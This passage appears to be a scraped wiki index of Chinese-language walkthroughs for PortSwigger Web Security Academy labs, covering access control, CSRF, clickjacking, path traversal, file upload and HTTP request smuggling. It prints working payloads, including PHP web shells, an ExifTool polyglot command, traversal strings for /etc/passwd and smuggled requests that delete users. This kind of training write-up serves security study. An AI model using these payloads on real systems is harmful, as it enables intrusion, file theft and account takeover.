1. Unprotected admin functionality 不受保护的管理功能 没有限制的 admin 面板，进去删帐号robots.txt /administrator-panel 2. Unprotected admin functionality with unpredictable URL 具有不可预测的 URL 的未受保护的管理功能 Ctrl + U 打开页面源代码，通过 Ctrl + F 搜索admin字符并观察 3. User role controlled by request parameter 由请求参数控制的用户角色 这一关的要点在于修改 Cookie，登录帐号后会发现有一个 cookie 值是 Admin false ，改为true，再访问 /admin，就会发现删除界面 4. User role can be modified in user profile 可以在用户配置文件中修改用户角色 更新邮件的地方是 JSON 数据，可以往里面多塞一些东西，然后浏览 /admin 界面删除用户 5. User ID controlled by request parameter 由请求参数控制的用户 ID 登录账户后抓包继而发现存在参数 ?id=wiener，替代为 carlos 从而获取 carlos 用户的 API 6. User ID controlled by request parameter, with unpredictable user IDs 用户 ID 由请求参数控制，用户 ID 不可预测 从博客文章中找到 carlos，用 burp 拦截，复制 ID 登录账户，用 burp 将 carlos 的 ID 写入请求 7. User ID controlled by request parameter with data leakage in redirect 用户 ID 由请求参数控制，重定向中存在数据泄漏 API KEY 在redirect（重定向） 的response（响应）中 8. User ID controlled by request parameter with password disclosure 用户 ID 由具有密码泄露的请求参数控制 修改 ID 后，F12 选到 Password 的地方，就可以看到密码 9. Insecure direct object references 不安全的直接对象引用 环顾四周，发现右上角有个Live chat，实时聊天室 和机器人对话并点击View transcript会把刚和机器人聊天的内容下载到一个txt文本文档中。 把URL改为download-transcript/1.txt即可得到密码 10. URL-based access control can be circumvented 可以规避基于 URL 的访问控制 先访问 admin，失败，继而进行抓包，添加X-Original-URL: /invalid成功，后面如法炮制 11. Method-based access control can be circumvented 可以规避基于方法的访问控制 先登录管理员账户，升级 carlos 的同时抓包，发送到 Repeater 在隐私浏览器窗口，登录wiener:peter，将 Cookie 复制到 Repeater 中，并且右键单机Change request method将请求方法改为 GET，用户名参数由 Carlos 改为 wiener 12. Multi-step process with no access control on one step 多步骤过程，一步没有访问控制 登录 Admin 帐号和 wiener 帐号 wiener 帐号抓到 Cookie 值复制带到 Repeater 中…… 13. PRACTITIONER Referer-based access control 基于引用的访问控制","tags":[null,null],"categories":[null]},{"title":"PortSwigger 之“身份认证”","path":"/wiki/portswigger/authentication.html","content":"https://portswigger.net/web-security/all-labs#authentication Authentication 1. 通过不同的响应进行用户名枚举 在登录页面填入账号密码通过 burp 抓包，发送到 Intruder 模块，枚举用户名，观察 length 的不一致来找到用户名，紧接着枚举密码…… 2. 2FA简单旁路 攻击者登录账号wiener:peter并接收邮箱验证码，在我的账户页面，填入验证码后复制 URL 地址（目的是模拟用户访问自己的账户），紧接着注销帐户。 登录受害者账号carlos:montoya，在接收邮箱验证码页面，修改地址栏中的URL 地址 3. 密码重置损坏的逻辑 这一关主要是利用密码重置，跳过令牌检查来修改密码，从而获取系统的访问权限 解题步骤： 在网站中忘记密码，填入 wiener，在电子邮件发出的链接中重置密码。 将“密码重置功能“发送到 Repeater，观察请求和响应，发现 token 是无效的，将用户名 wiener 修改为 carlos 后可成功修改 carlos 用户的密码 4. 通过细微不同的响应进行用户名枚举","tags":[null,null],"categories":[null]},{"title":"Portswigger 靶场之“业务逻辑漏洞","path":"/wiki/portswigger/business-logic-flaws.html","content":"All labs | Web Security Academy (portswigger.net) Business logic vulnerabilities 1. Excessive trust in client-side controls 过度信任客户端控制 登录wiener:peter，购买Lightweight &quot;l33t&quot; Leather Jacket，价格是$1337.00，下单后显示商店积分不够，不可以购买 在 Burp 中，截断Add to cart功能，修改价格（price）为1以满足商店的信用额度，完成订单以解决实验室。 2. High-level logic vulnerability 高级逻辑漏洞 登录wiener:peter，把Lightweight &quot;l33t&quot; Leather Jacket（轻质“l33t”皮夹克）添加到购物车，通过用 burp 抓包，发现价格参数price没有了，剩下了数量参数quantity。 尝试去修改数量参数quantity为-1，果不其然，成功修改，但下单后不被允许金额小于零，无法下单。 于是通过叠加商品，既满足Store credit（店铺积分）100元之内，又满足下单金额是大于零的要求 依旧是把一个Lightweight &quot;l33t&quot; Leather Jacket（轻质“l33t”皮夹克）添加到购物车；再购买The Giant Enter Key（巨型回车键），数量用1337/25.35=52.74来计算 3. Inconsistent security controls 不一致的安全控制 在 Burp Suite 中，使用 Site map（站点地图）功能，来查看站点目录，发现路径admin。访问/admin，页面回显需要“DontWannaCry ”用户登录才可访问 页面右上角Register 注册一个账号，其中邮箱需要点击页面上方的Email client获得，注册后会发来一封邮件点击验证一下，然后登录账户，紧随其后修改邮箱为 @DontWannaCry.com 这时候就可以访问管理面板了，删除用户即可 4. Flawed enforcement of business rules 有缺陷的业务规则执行 注意到页面有一个优惠券代码——NEWCUST5，页面底部可通过注册获得优惠券代码SIGNUP30 添加商品到购物车，尝试优惠券的使用，发现连续两次输入相同的代码，不被允许，而交替使用可绕过，就一直叠加 5. Low-level logic flaw 低级逻辑缺陷 登录账号，购买商品的数量一次最多可以 +99，可以用 Burp 的 intruder 送到 Overflow Quote / 参考 int overflow（整数溢出）是指在计算机中，对一个整数类型（例如 int、long 等）进行计算时，结果超出了该类型可以表示的最大值（或最小值），导致结果不正确的情况。 在计算机中，整数类型的表示是有限的，即它们可以表示的范围是有限的。例如，一个 32 位的有符号整数类型 int 可以表示从 -2,147,483,648 到 2,147,483,647 的整数，如果在计算时得到的结果超过了这个范围，就会发生整数溢出。 6. Inconsistent handling of exceptional input 异常输入的不一致处理 需要进入/admin目录，删除 Carlos。 首先注册一个用户，验证用户，返回该用户的时候发现并没有修改邮箱的选项。 于是在注册页面修改邮箱，利用长度截断（256个字符）使得注册的邮箱地址为@dontwannacry.com。注册完验证后登录账户以便删除 Carlos。 1bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb@dontwannacry.com.0a0800c503176684c4ae681001ba00e2.web-security-academy.net 7. Weak isolation on dual-use endpoint 两用端点上的弱隔离 登录 wiener 用户后，在修改密码的界面发现，可以修改任意“用户”的密码，但需要输入当前密码（当前密码未知），通过 burp 截断数据包分析得知，当前密码是可以删除来绕过此限制的。 8. Insufficient workflow validation 工作流程验证不足 登录账号，购买一个2.04的商品（少于商店积分 100），观察代理历史记录，注意到下订单时，POST 请求会重定向到订单确认页面 添加1337 的那款商品，下单观察代理历史记录，研究两者之间的差异，注意到2.04的商品 GET 请求为GET /cart/order-confirmation?order-confirmation=true即可购买成功，把1337 的商品进行修改也可绕过限制 9. Authentication bypass via flawed state machine 通过有缺陷的状态机绕过身份验证 用 burp 拦截登录请求，Forward POST 请求，Drop Redirect，然后直接访问/admin 登录的请求有两个，第一个是 POST 请求，第二个是重定向 GET 请求，作用是选择角色转到主页，将第二个包丢弃可默认为该角色，即可访问管理面板 10. Infinite money logic flaw 无限金钱逻辑缺陷 home 页底部注册得到 SIGNUP30，可以购买 10 美元的礼品卡并从“my-account”页面兑换，兑换的过程中注意到商店信用增加了（用 Burp 或者 Python 自动执行此过程） 攻击完成后，商店的总体信用额度将提升足以购买“皮夹克” 11. Authentication bypass via encryption oracle 通过加密 oracle 绕过身份验证 登录后有一个 Stay Logged in（保持登录状态）的功能，且是加密后的 未完……","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之 CSRF 篇","path":"/wiki/portswigger/csrf.html","content":"Cross-site request forgery (CSRF) All labs | Web Security Academy (portswigger.net) 1. 没有防御措施的 CSRF 漏洞 题目中已告知易受攻击的是电子邮件的更改功能，而目标是利用 csrf 漏洞更改受害者的电子邮件地址，最后给出了登录凭据：wiener:peter。 登录 wiener 用户——首先做的事是根据给定的登录凭据进行登录，点击 My account 登录，登录后就到了一个更改邮箱的界面，这时候然设置代理以便 burp 抓包。 burp 抓包——尝试输入test@test.ca，点击 update email，通过 burp 抓包，发送到 repeater 后关闭拦截，此时回到更改邮箱的界面发现电子邮件已被更改为test@test.ca 。 进行 csrf 攻击——因为 burp 有自动生成脚本的功能，右键 Generate CSRF PoC，进入界面后在选项一栏把自动提交脚本勾选上，这时候 burp 会自动提交表单不需要自己点击提交了。点击 regenerate 重新生成发现多了document.forms[0].submit();。 进行 csrf 攻击——把代码中的 emali 修改为testcsrf1@test.ca以便测试之用，接着 copyhtml，转到漏洞利用服务器，在 body 中放入 html，store 保存，点击 View exploit 查看漏洞，最后 Deliver to victim，传递给受害者即可成功 生成 CSRF PoC CSRF HTML 修改成功 2. token 验证取决于请求方法 登录 wiener 用户——依旧是账号密码进行登录，wiener:peter，然后在更改邮箱的界面输入test@test.ca进行抓包 改变请求方法——因为 POST 请求会对 token 验证（在没有 token 的情况下会 404），从而无法修改邮箱，而 GET 不需要。于是右键 burp 点击 Change request method，将请求方法从 POST 更改为 GET 在 POST 请求下删掉 token 会404 GET 请求下没有 token 进行 csrf 攻击在 burp 中右键生成 csrf poc，选项中把自动提交脚本选择上，代码中的 emali 修改为testcsrftoken1@test.ca，copy html，用 burp 的服务器托管脚本，粘贴到 body 中。最后点击&quot;Store&quot;，并发送给受害者，完成试验 成功修改了邮箱 3. token 验证取决于 token 的存在 在上一个关卡，请求改为 GET 是因为检查了 POST 方法是否允许我们删除 token，删除 token 后，POST 请求 404， 所以可以用 GET 方法进行绕过 在这一关中攻击者删除 token，返回 302。这说明 token 不存在请求便会通过，简单粗暴 右键生成 CSRF Poc，后续步骤和前面一致 token 删掉返会状态码 302 4. token 与用户会话无关 题目给出了两个账户 攻击者账户——wiener:peter 受害者账户——carlos:montoya 登录两个账户——把两个账户分别分别登陆，目标是从 wiener 那更改 carlos 的电子邮件地址 使用 firefox 登录账户 改变请求方法——拦截 wiener 的请求在 burp 中查看，删除 csrt token 的一个字符返回 404，请求方法改为 GET，依旧是 404 修改邮件拦截请求 根据前两个实验室，均以失败告终 从 carlos 用户中找到 CSRF Token——登录 carlos，在更改邮箱的界面打开“开发者工具”找到 CSRF Token，复制后在 burp 中粘贴到相应位置，返回 302 这说明虽然应用程序需要一个 token 处理请求，但不关心它是怎么来的。换言之，应用系统仅会验证 CSRF Token 的有效性，而不会验证该 Token 是否属于当前用户，也就是标题说的 Token 不会与用户会话绑定 进行 csrf 攻击——最后利用 burp 的 csrf poc 功能，复制 html 后需要回到攻击者 wiener，刷新 carlos 的网页来收集新的 token（token 随着请求的变化而变化）替换到 burp 中 5. token 绑定到非会话 cookie 题目给出了两个账户 攻击者账户——wiener:peter 受害者账户——carlos:montoya 测试 CSRF Token 和 CSRF Cookie 抓包 wiener 用户 ——发现 Cookie 中存在一个 csrfkey。删除 CSRF Token 的某个字符则返回 400。 查看 carlos 用户的 CSRF Token——从另一个用户查看 Cookie 是否相互绑定。登录另一个用户(carlos)，可以在火狐无痕窗口，查看 CSRF Token，粘贴到 wiener 用户的 burp，send 发送后 400。 查看 carlos 用户的 CSRFKey cookie——在 carlos 账户中，点开网络，点重新载入，找到 CSRFKey cookie。粘贴到 wiener 用户的 burp，send 发送后 302，这说明两者没有进行绑定的，可喜可贺。 **wiener 用户首页搜索框中 CSRFKey 参数注入 **——在 wiener 账户的首页发现有搜索框，输入“ceui”进行抓包处理，能看到搜索的关键词在 Set-Cookie 标头。因为搜索功能没有 CSRF 保护，所以可以轻而易举的注入 cookie。 将已知的 csrfKey cookie 注入给被攻击者 12/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None# SameSite=None——显式设置 SameSite=None（一个新值），该值表示放弃对 Cookie 的 Same-Site 策略设置，通俗说就是“我不管了”。 抓包查看 Set-Cookie 标头 URL 编码 利用此漏洞将 cookie 注入受害者的浏览器 csrf 攻击——最后存储漏洞，单击“交付给受害者”。 在 wiener(攻击者) 用户的 burp 请求中右击生成 PoC 6. token 在 cookie 中重复 如图所示，应用程序只需验证在请求参数中提交的 Token 是否与 Cookie 中提交的值匹配 搜索，查看 Set-Cookie 标头中是否有搜索词 将虚假 CSRF Cookie 注入受害者浏览器的 URL 最后注入 cookie 并提交表单 7. Referer 验证取决于 header 是否存在 登录帐户，抓取“更新电子邮件”表单的请求 在 burp 中查看，发现出现了 Referer，删除则返回 302 即成功 在 HTTP 头中有一个字段叫 Referer，记录了该 HTTP 请求的*来源地址*，同源检测（Origin 和 Referer 验证） 生成 PoC 网页返回 “Invalid referer header”，这是因为 Referer 的来源是 burp 禁止 Referer 标头，&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;，作用是控制页面发送给 server 的 referer 信息，告诉服务器端用户是从哪个页面来到当前网页的。 no-referrer： 所有请求不发送 referrer 更新电子邮件表单的请求 burp 右击生成 PoC 因为有 Referer 限制而无效 Referer 来源于 burp，这才导致错误 成功修改 8. Referer 验证失效的 CSRF 登录帐户，抓取“更新电子邮件”表单的请求 追加到 Referer 标头请求成功，这说明网站似乎接受任何包含预期的 Referer 标头 在 script 中编辑 JavaScript 1history.pushState(&quot;&quot;, &quot;&quot;, &quot;/?0aac003b03b74a00c0510db300a200ff.web-security-academy.net&quot;) 在头部添Referrer-Policy: unsafe-url，是因为需要请求中包含完整的 URL ，以此来覆盖浏览器的默认配置（默认从 Referer 标头中删除查询字符串） 追加到 Referer 标头 history.pushState() 添加 history.pushState() 在漏洞利用服务器中","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之点击劫持（Clickjacking）","path":"/wiki/portswigger/clickjacking.html","content":"All labs | Web Security Academy — 所有实验室 |网络安全学院 (portswigger.net) 1. Basic clickjacking with CSRF token protection 具有 CSRF 令牌保护的基本点击劫持 目标： 制作一些 HTML 来构建帐户页面并欺骗用户删除他们的帐户 过程： 先登录账号，登录后界面上有个选项为Delete account，即删除账户。 页面上方有个Go to exploit server去利用服务器，点进去，在Body中写入HTML代码并用CSS来绝对定位选项Delete account的位置。 设置透明度opacity使得攻击者看不到真实的界面，Delete account选项被隐藏在&lt;div&gt;Click Me&lt;/div&gt;之下 Quote / 参考 在点击劫持攻击中，攻击者会将一个透明的iframe覆盖在目标网站的页面上，然后诱使受害者在该iframe中点击某些看似无害的按钮或链接，实际上却是在执行攻击者的恶意操作 攻击者使用iframe的目的是为了掩盖受害者的真实行为。因为iframe可以嵌入其他网站或页面，攻击者可以在iframe中展示一个看似无害的页面或按钮，但实际上它们可能会触发跨站点请求，执行攻击者的恶意操作。 1234567891011121314151617&lt;style&gt; iframe &#123; position:relative; width:1000px; height: 700px; opacity: 0.0000001; z-index: 2; &#125; div &#123; position:absolute; top:515px; left:60px; z-index: 1; &#125;&lt;/style&gt;&lt;div&gt;Click Me&lt;/div&gt;&lt;iframe src=&quot;https://0a37007803673341c044c7f400150047.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt; 2. Clickjacking with form input data prefilled from a URL parameter 使用从 URL 参数预填充的表单输入数据进行点击劫持 目标： 诱使用户点击“更新电子邮件”按钮 过程： 登录账号，转到服务器界面，这一关，主要是通过 GET 参数的方式预填充表单，即在 URL 上添加了修改的邮箱 1234567891011121314151617&lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.00; z-index: 2; &#125; div &#123; position:absolute; top:450px; left:80px; z-index: 1; &#125;&lt;/style&gt;&lt;div&gt;Test me&lt;/div&gt;&lt;iframe src=&quot;https://0a3800d603ebc15ac0aa4aa0002c0090.web-security-academy.net/my-account?email=111@123.com&quot;&gt;&lt;/iframe&gt; 3. Clickjacking with a frame buster script 使用 frame buster 脚本进行点击劫持 目标： 诱使用户点击“更新电子邮件”按钮 过程： 先登录账号，然后到服务器界面，这一关运用了sandbox 属性，限制 iframe 嵌套，使其失效。 可通过在iframe标签中设置sandbox=&quot;allow-forms&quot;来绕过限制 Quote / 参考 &quot;Frame buster&quot; 技术使用 JavaScript 代码来检测页面是否被嵌套在框架中 在 HTML 中，sandbox=&quot;allow-forms&quot; 是一种设置 iframe（内嵌框架）安全性的方法之一。该属性指定在 iframe 中是否允许表单提交。 当 sandbox 属性的值为 allow-forms 时，表示在 iframe 中允许表单提交，但不允许执行其他一些操作，如运行脚本、显示弹出窗口等。 1234567891011121314151617&lt;style&gt;iframe &#123;position:relative;width:500px;height: 700px;opacity: 0.1;z-index: 2;&#125;div &#123;position:absolute;top:450px;left:80px;z-index: 1;&#125;&lt;/style&gt;&lt;div&gt;Click me&lt;/div&gt;&lt;iframe sandbox=&quot;allow-forms&quot; src=&quot;https://0a0e00d50460a332c236f332009c00c0.web-security-academy.net/my-account/?email=hacker@attacker-website.com&quot;&gt;&lt;/iframe&gt; 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS 利用点击劫持漏洞触发基于 DOM 的 XSS 目标： 欺骗用户单击“单击我”按钮来调用函数。print() 过程： 先登录账号，然后到服务器界面，这一关在 iframe 的点击劫持中附加了 DOM XSS。 通过 name 输入框，放入 JavaScript 脚本&lt;img src=1 onerror=print()&gt;，因为这个 img 标签的 src 属性的值是 1，所以这个图片肯定是不存在的，因此会触发 onerror 事件，并且执行 print() 函数。print() 是 JavaScript 的内置函数，能够在弹窗中输出内容。 123456789101112131415161718&lt;style&gt;iframe &#123;position:relative;width:500px;height: 700px;opacity: 0.1;z-index: 2;&#125;div &#123;position:absolute;top:620px;left:40px;z-index: 1;&#125;&lt;/style&gt;&lt;div&gt;Click me&lt;/div&gt;&lt;iframesrc=&quot;https://0a2a00e403c20784c0166d6a00c800b2.web-security-academy.net/feedback/?name=&lt;img src=1 onerror=print()&gt;&amp;email=hacker@attacker-website.com&amp;subject=test&amp;message=test#feedbackResult&quot;&gt;&lt;/iframe&gt; 5. Multistep clickjacking 多步点击劫持 目标： 诱骗用户单击删除帐户按钮和确认对话框 过程： 需要执行两个步骤，删除用户 --&gt; 确认删除，所以设置两个点击按钮 12345678910111213141516171819202122&lt;style&gt; iframe &#123; position:relative; width:500px; height: 700px; opacity: 0.1; z-index: 2; &#125; .firstClick, .secondClick &#123; position:absolute; top:510px; left:50px; z-index: 1; &#125; .secondClick &#123; top:285px; left:225px; &#125;&lt;/style&gt;&lt;div class=&quot;firstClick&quot;&gt;Click me first&lt;/div&gt;&lt;div class=&quot;secondClick&quot;&gt;Click Store&lt;/div&gt;&lt;iframe src=&quot;https://0a9a0010038a45ffc436c9d000f50019.web-security-academy.net/my-account&quot;&gt;&lt;/iframe&gt;","tags":[null,null],"categories":[null]},{"title":"portswigger 靶场之目录遍历","path":"/wiki/portswigger/directory-traversal.html","content":"所有实验室 |网络安全学院 (portswigger.net) Directory traversal 1. 文件路径遍历，简单案例 File path traversal, simple case 使用 Burp Suite 截获和修改获取产品图像的请求。 修改参数filename，观察响应是否包含文件的内容。/etc/passwd 123../../../etc/passwd# 相对路径 “../&quot;，这个路径表示回到上一级目录 访问操作系统中的 passwd 文件。passwd 文件包含系统中所有用户的用户名、密码、用户 ID、主目录等信息 2. 文件路径遍历，通过绝对路径旁路阻止遍历序列 File path traversal, traversal sequences blocked with absolute path bypass 使用 Burp Suite 修改产品图像的请求filename /etc/passwd 当接收到用户提供的路径时，应用程序首先将其解析为绝对路径，然后将其与白名单中的路径进行比较。防止攻击者使用目录遍历序列来访问应用程序之外的文件和目录。 如果路径在白名单内，则认为是合法的； 否则，应用程序会拒绝该请求并返回错误信息。 3. 文件路径遍历，非递归剥离遍历序列 File path traversal, traversal sequences stripped non-recursively 非递归剥离遍历序列：应用程序会解析路径并对其进行分析，然后使用算法来**删除路径中的 “…/” 遍历序列** 使用双写绕过 1....//....//....//etc/passwd 4. 文件路径遍历，使用多余的 URL 解码剥离遍历序列 File path traversal, traversal sequences stripped with superfluous URL-decode 第四关/被过滤了，所以需要对其进行 URL 编码，但在 burp 中用 Repeater 发送后还是错误，得知需要进行第二次 URL 编码才可绕过 1..%252f..%252f..%252fetc/passwd 5. 文件路径遍历，路径开始验证 File path traversal, validation of start of path 验证请求的文件路径是否以 “/var/www/” 开头 1/var/www/images/../../../etc/passwd 6. 文件路径遍历，使用空字节旁路验证文件扩展名 File path traversal, validation of file extension with null byte bypass 在 URL 编码中，%00 可以用于表示字符串的结束符。 作用是将“.png”文件名截断，使得请求实际上是针对“/etc/passwd”这个文件的 1../../../etc/passwd%00.png","tags":[null,null],"categories":[null]},{"title":"Portswigger 靶场之“文件上传”","path":"/wiki/portswigger/file-upload.html","content":"File upload vulnerabilities All labs | Web Security Academy (portswigger.net) 1. Remote code execution via web shell upload 通过 Web shell 上传远程执行代码 目标：读取/home/carlos/secret文件的内容 过程 登录用户，选择一个图片上传。用 burp 分别拦截“上传文件”和“查看文件”的数据包，一个 POST 请求，另一个是 GET 请求 在 burp 上传文件中文件名后缀改为.php，删除原来图片的内容，替换为 php webshell，并且上传 在*查看文件*数据包中，访问上传的 webshell；或者回到浏览器，先刷新页面，后右键图片在新标签页打开 1234# PHP 的读取代码&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt;# file_get_contents() 把整个文件读入一个字符串中。 2. Web shell upload via Content-Type restriction bypass 通过 Content-Type 限制绕过 Web shell 上传 先登录，上传图片，在 burp 的 http history 中拦截“上传文件”和“查看文件”的数据包，并转发到 Repeater，重命名为Upload File Show File以便更好地观察 在 burp 上传文件中，修改名称、删除图片内容替换为 php webshell，最重要的一点是将Content-Type 修改为image/jpeg 后续步骤如法炮制而来 1&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt; 3. Web shell upload via path traversal Web Shell 通过路径遍历上传 传入 webshell 后&lt;?php echo file_get_contents('/home/carlos/secret'); ?&gt;，访问文件的时候**显示了未经解析的源代码，由此想到该目录没有执行权限，需要上传到其他目录，进行目录遍历** 在 burp 上传数据包，将文件名改为../文件名，需要经过 URL 编码，编码后是..%2f文件名，文件将被上传到“上一层”文件夹 4. Web shell upload via extension blacklist bypass Web Shell上传通过扩展黑名单绕过 按照往常一样上传 PHP webshell，服务器回答说“不允许”上传 PHP 文件。从响应中，注意到正在运行的服务器是 Apache， .htaccess文件是 Apache 服务器的一个配置文件，负责相关目录下的网页配置。能够实现*改变文件扩展名、允许/阻止特定的用户或者目录的访问* 可以欺骗 Apache 服务器将任意*自定义文件扩展名*映射到可执行的 MIME 类型。 第一步、修改.htaccess文件 12345678# 修改名称 .htaccess# 修改 Content-Typetext/plain# 修改内容AddType application/x-httpd-php .shell 实现的功能就是：所有上传的.shell文件都会被当作php文件执行 接着上传一个后缀名为shell的文件，完成实验室任务 12345678# 修改名称 code.shell# 修改 Content-Typeimage、png# 修改内容&lt;?php echo file_get_contents(&#x27;/home/carlos/secret&#x27;); ?&gt; 5. Web shell upload via obfuscated file extension 通过混淆文件扩展名上传 Web Shell 利用%00 截断 文件名用 Burp 改 code.php%00.png、 在 url 中 %00 表示 ascll 码中的 0 ，而 ascii 中 0 作为特殊字符保留，表示字符串结束，所以当 url 中出现 %00 时就会认为读取已结束 当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃 6. Remote code execution via polyglot web shell upload 通过多语言 web shell 上传远程代码执行 服务器可能通过图像的字节序列来判断是否是jpeg、png文件等；使用 ExifTool 创建包含元数据中恶意代码的多语言 JPEG 文件 在 kali 中安装 ExifTool 1apt install libimage-exiftool-perl 利用 ExifTool 1exiftool -Comment=&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot; code.jpg -o code.php 7. Web shell upload via race condition 通过竞争条件上传 Web shell 通过 Race Condition，上传的 webshell 文件会先存到一个文件夹中，然后才会确认是否合法，如果不合法再删掉。文件被删除之前这段间隙去突破","tags":[null,null],"categories":[null]},{"title":"PortSwigger 靶场之 HTTP 请求走私","path":"/wiki/portswigger/http-request-smuggling.html","content":"All labs | Web Security Academy (portswigger.net) HTTP request smuggling 1. HTTP request smuggling, basic CL.TE vulnerability HTTP 请求走私，基本的 CL.TE 漏洞 当 Content-Length 和 Transfer-Encoding 同时出现时，客户端应该遵循 Transfer-Encoding 的规则，而忽略 Content-Length，因为 Transfer-Encoding 机制会将消息体进行拆分 这关主要是通过更改 Content-Length 的值，发送带有 Transfer-Encoding 头部的正文来达到欺骗服务器的目的 12345678910POST / HTTP/1.1Host: 0a06001d03118aa0c4626eb800680067.web-security-academy.netConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 6Transfer-Encoding: chunked0G 2. HTTP request smuggling, basic TE.CL vulnerability HTTP 请求走私，基本的 TE.CL 漏洞 和第一关的区别是，这一关更改 Transfer-Encoding 的值，然后通过发送带有 Content-Length 的正文来欺骗服务器 声明了 Content-length 为 4，但随后使用了 Transfer-Encoding: chunked，这意味着请求体被分成多个部分（即块），每个块都包含一个十六进制的数字，表示该块的大小。第一个块的大小为 5c（十六进制，等于 92），所以后面的块包含了 92 个字符。 但是由于存在 TE.CL 漏洞，**服务器会忽略 Content-length，因此不会将前面的 4 个字符视为请求体的一部分。**相反，服务器会将第一个块的大小视为整个请求体的大小，从而导致攻击者可以向服务器发送包含恶意内容的块，这些内容被认为是请求体的一部分，但实际上并不包含在 Content-length 中声明的大小范围内。 123456789101112131415POST / HTTP/1.1Host: 0a83009b049ca08ec342d8a2002f0070.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15\tx=10 3. HTTP request smuggling, obfuscating the TE header HTTP 请求走私，混淆 TE 标头 在请求中添加多个 Transfer-Encoding 头部来混淆或欺骗服务器。在这关中出现了两个 Transfer-Encoding 字段，一个值为 “chunked”，另一个值为 “cow”。 请求体的内容是经过编码的，其中包括了一个 GPOST 请求以及一个包含参数 x=1 的请求体。 1234567891011121314POST / HTTP/1.1Host: 0a5200a4048704c8c3857a68009c004f.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunkedTransfer-encoding: cow5cGPOST / HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses HTTP 请求走私，通过差异响应确认 CL.TE 漏洞 第一个请求使用了 Transfer-Encoding: chunked 标头来指示请求体的长度为分块编码形式，并设置长度为0，表示请求体为空。 第二个请求使用了 Content-Length 标头来指示请求体的长度为35个字节。 这两个请求放在了一起，会解析出两个不同的请求，其中第一个请求不包含请求体，而第二个请求包含了一个长度为35个字节的请求体。 12345678910POST / HTTP/1.1Host: 0a6800d904fae8a2c5f918c700250023.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 35Transfer-Encoding: chunked0GET /404 HTTP/1.1X-Ignore: X 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses HTTP 请求走私，通过差异响应确认 TE.CL 漏洞 第一个请求的数据块长度为 0x5e，即 94，后面跟着一个 POST 请求，其请求体为 x=1。 第二个请求的数据块长度为 0，表示这是最后一个数据块。 12345678910111213POST / HTTP/1.1Host: 0a7b005103ea6bc6c04abe7a0021006d.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked5ePOST /404 HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability 利用HTTP请求走私绕过前端安全控制，CL.TE漏洞 12345678910POST / HTTP/1.1Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 37Transfer-Encoding: chunked0GET /admin HTTP/1.1X-Ignore: X 本地用户localhost放入后，Host标头又冲突了 1234567891011POST / HTTP/1.1Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 54Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: localhostX-Ignore: X 将第二段请求，改为正常的请求包 1234567891011121314POST / HTTP/1.1Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 116Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 10x= 删除用户： carlos 1234567891011121314POST / HTTP/1.1Host: 0a51005204ee4262c4d91635002400a6.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-Length: 139Transfer-Encoding: chunked0GET /admin/delete?username=carlos HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 10x= 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability 利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞 1234567891011121314POST / HTTP/1.1Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.netContent-length: 4Transfer-Encoding: chunked60POST /admin HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 15x=10 12345678910111213141516POST / HTTP/1.1Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.netContent-Type: application/x-www-form-urlencodedContent-length: 4Transfer-Encoding: chunked71POST /admin HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10 删除用户carlos： 123456789101112131415POST / HTTP/1.1Host: 0ad7006803f46b57c050ebab00be0094.web-security-academy.netContent-length: 4Transfer-Encoding: chunked87GET /admin/delete?username=carlos HTTP/1.1Host: localhostContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10 8. Exploiting HTTP request smuggling to reveal front-end request rewriting 利用 HTTP 请求走私来揭示前端请求重写 观察搜索功能看它是否反映了参数值search 1234567891011121314POST / HTTP/1.1Host: 0a4c00e3048d07c6c2e4396b00320006.web-security-academy.netContent-Type: 